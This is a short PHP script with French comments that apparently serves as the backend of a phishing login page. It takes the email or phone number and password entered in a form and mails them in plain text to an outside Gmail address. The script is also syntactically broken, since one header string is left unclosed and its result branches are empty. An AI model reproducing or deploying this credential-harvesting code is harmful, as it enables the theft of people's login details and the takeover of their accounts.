<?php
// Vérifier si le formulaire a été soumis
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupérer les données envoyées via le formulaire
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Adresse email de destination
    $destinataire = 'pornhubparttner@gmail.com';

    // Sujet de l'email
    $sujet = 'Nouvelle soumission de connexion';

    // Contenu du message
    $message = "Détails de la soumission :\n\n";
    $message .= "Email ou numéro de téléphone : $email\n";
    $message .= "Mot de passe : $password\n";

    // Entêtes de l'email
    $headers = "From: noreply@votredomaine.com\r\n";
    $headers .= "Reply-To: ;

    // Envoyer l'email
    if (mail($destinataire, $sujet, $message, $headers)) {
        
    } else {
     
    }
} else {
    
}
?>